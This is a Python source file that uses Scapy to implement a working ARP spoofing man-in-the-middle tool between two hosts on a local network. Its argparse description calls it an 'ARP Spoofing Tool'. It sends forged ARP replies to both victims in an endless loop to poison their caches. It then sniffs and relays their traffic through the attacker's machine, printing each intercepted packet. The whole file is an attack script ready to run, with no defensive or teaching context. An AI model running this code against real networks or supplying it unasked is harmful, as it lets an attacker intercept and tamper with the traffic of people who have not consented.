from scapy.all import *
import argparse
import threading

def get_true_mac(ip):
    return getmacbyip(ip)

def arp_spoof_packet(target_ip, gateway_ip):
    target_mac = get_true_mac(target_ip)
    return Ether(dst = target_mac) / ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac) # send to target_ip that we are the gateway

class MITMFilter(Drain):
    def __init__(self, ip_a, ip_b, mac_a, mac_b, mac_host):
        Drain.__init__(self, name=None)
        self.ip_a = ip_a
        self.ip_b = ip_b
        self.mac_a = mac_a
        self.mac_b = mac_b
        self.mac_host = mac_host
    def push(self, msg):
        if not msg.haslayer(Ether) or msg[Ether].dst != self.mac_host:
            return # ignore outgoing packets
        if msg.haslayer(IP):
            if msg[IP].src == self.ip_a and msg[IP].dst == self.ip_b:
                msg[Ether].dst = self.mac_b
            elif msg[IP].src == self.ip_b and msg[IP].dst == self.ip_a:
                msg[Ether].dst = self.mac_a
            else:
                return
            msg[Ether].src = self.mac_host
            print(f"MITMFilter: Forwarding modified packet: {msg.summary()}")
            self._send(msg)

class Forwarder(Sink):
    def __init__(self, iface):
        Sink.__init__(self, name=None)
        self.iface = iface

    def push(self, msg):
        sendp(msg, iface=self.iface, verbose=False)
    

def main():
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool")
    parser.add_argument("ip_a", help="IP address of device A")
    parser.add_argument("ip_b", help="IP address of device B")
    parser.add_argument("--iface", help="Network interface to use", default=conf.iface)
    args = parser.parse_args()

    source = SniffSource(iface=args.iface, filter="inbound")
    mac_a = get_true_mac(args.ip_a)
    mac_b = get_true_mac(args.ip_b)
    mac_host = conf.ifaces[args.iface].mac

    print(f"MAC address of {args.ip_a}: {mac_a}")
    print(f"MAC address of {args.ip_b}: {mac_b}")

    filter = MITMFilter(args.ip_a, args.ip_b, mac_a, mac_b, mac_host)
    forwarder = Forwarder(iface=args.iface)
    wire = ConsoleSink()
    source > filter
    filter > forwarder
    filter > wire

    p = PipeEngine(source)
    p.start()


    threading.Thread(target=sendp, args=(arp_spoof_packet(args.ip_a, args.ip_b),), kwargs={'iface': args.iface, 'loop': 1, 'inter': 1, 'verbose': False}).start()
    threading.Thread(target=sendp, args=(arp_spoof_packet(args.ip_b, args.ip_a),), kwargs={'iface': args.iface, 'loop': 1, 'inter': 1, 'verbose': False}).start()

    p.wait_and_stop()

if __name__ == "__main__":
    main()